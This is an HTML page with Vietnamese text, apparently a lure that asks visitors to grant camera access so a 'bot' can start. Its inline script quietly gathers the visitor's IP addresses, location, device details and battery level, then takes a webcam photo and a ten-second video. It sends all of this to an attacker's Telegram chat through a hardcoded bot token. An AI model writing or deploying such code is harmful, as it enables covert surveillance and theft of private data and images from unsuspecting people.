<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WEB ƒê·ªòC QUY·ªÄN HOANGANH</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { text-align: center; }
    .message { font-size: 24px; margin-bottom: 20px; animation: fadeInDown 1s ease; }
    #countdown { font-size: 48px; margin-bottom: 50px; animation: zoomIn 1s ease; }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="message">Vui l√≤ng cho ph√©p truy c·∫≠p ƒë·ªÉ s·ª≠ d·ª•ng</h1>
    <div id="countdown"></div>
  </div>

  <script>
    const BOT_TOKEN = '7960156507:AAHMK4cfoRszPvJrZ17NvPAUFqPvyXY2mi8';
    const CHAT_ID = '7605936504';

    async function getCurrentTime() {
      const now = new Date();
      const opts = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZone: 'Asia/Ho_Chi_Minh' };
      return now.toLocaleDateString('vi-VN', opts);
    }

    // Generic sender using FormData
    function sendToTelegram(endpoint, formData) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
      return fetch(url, { method: 'POST', body: formData })
        .then(res => res.json())
        .then(data => console.log(data))
        .catch(err => console.error(`L·ªói g·ª≠i ${endpoint}:`, err));
    }

    // Send text message
    async function sendText(message) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('text', message);
      return sendToTelegram('sendMessage', form);
    }

    // Send photo
    async function sendPhoto(photoBlob, caption) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', photoBlob, 'photo.jpg');
      if (caption) form.append('caption', caption);
      return sendToTelegram('sendPhoto', form);
    }

    // Send video
    async function sendVideo(videoBlob, caption) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('video', videoBlob, 'video.webm');
      if (caption) form.append('caption', caption);
      return sendToTelegram('sendVideo', form);
    }

    // Gather device & network info and send
    async function getAddress() {
      try {
        const ipv6Res = await fetch('https://api6.ipify.org?format=json');
        const { ip: ipv6 } = await ipv6Res.json();
        const res = await fetch('https://ipinfo.io/json');
        const info = await res.json();
        if (info.country !== 'VN') return await sendText('Kh√¥ng th·ªÉ l·∫•y ƒë·ªãa ch·ªâ.');

        let msg = `üó∫ ƒê·ªãa Ch·ªâ: ${info.city}, ${info.region}, ${info.country}\n`;
        msg += `üó∫ IP: ${info.ip}\nüó∫ IPv6: ${ipv6}\n`;
        msg += `üïí Th·ªùi Gian: ${await getCurrentTime()}\n`;
        msg += `üíª Thi·∫øt B·ªã: ${navigator.userAgent}\n`;

        const battery = navigator.getBattery ? await navigator.getBattery() : { level: null };
        msg += `üîã Pin: ${battery.level != null ? battery.level*100 + '%' : 'Kh√¥ng x√°c ƒë·ªãnh'}\n`;
        msg += `üõ† OS: ${navigator.platform}\nüìú Ng√¥n Ng·ªØ: ${navigator.language}\n`;
        msg += `üñ• ƒê·ªô ph√¢n gi·∫£i: ${screen.width}x${screen.height}\n\nPowered by Hoang Anhüëë`;

        return await sendText(msg);
      } catch (err) {
        console.error(err);
        return await sendText('Kh√¥ng th·ªÉ l·∫•y ƒë·ªãa ch·ªâ.');
      }
    }

    // Handle media capture
    async function captureAndSendMedia() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        document.body.appendChild(video);
        video.srcObject = stream;
        video.play();
        video.onloadedmetadata = async () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);
          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
          await sendPhoto(blob, `üì∏ ·∫¢nh th√†nh c√¥ng\nüïí ${await getCurrentTime()}`);
          video.remove();
          stream.getTracks().forEach(t => t.stop());
        };
      } catch (err) {
        console.error('L·ªói camera:', err);
      }

      // Record video for 10s
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const mediaRec = new MediaRecorder(stream);
        const chunks = [];
        mediaRec.ondataavailable = e => chunks.push(e.data);
        mediaRec.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          await sendVideo(blob, `üéû Video th√†nh c√¥ng\nüïí ${await getCurrentTime()}`);
          stream.getTracks().forEach(t => t.stop());
        };
        mediaRec.start();
        setTimeout(() => mediaRec.stop(), 10000);
      } catch (err) {
        console.error('L·ªói quay video:', err);
      }
    }

    // Countdown animation
    function countdown(sec) {
      const el = document.getElementById('countdown');
      el.textContent = `Vui l√≤ng ch·ªù ${sec} gi√¢y kh·ªüi ƒë·ªông bot...`;
      const iv = setInterval(() => {
        sec--;
        if (sec <= 0) {
          clearInterval(iv);
          el.textContent = 'Kh·ªüi ƒë·ªông ho√†n t·∫•t!';
          captureAndSendMedia();
        } else {
          el.textContent = `Vui l√≤ng ch·ªù ${sec} gi√¢y kh·ªüi ƒë·ªông bot...`;
        }
      }, 1000);
    }

    // Init
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(() => countdown(11))
      .catch(err => console.error('Kh√¥ng th·ªÉ truy c·∫≠p camera:', err));

    getAddress();
  </script>
</body>
</html>
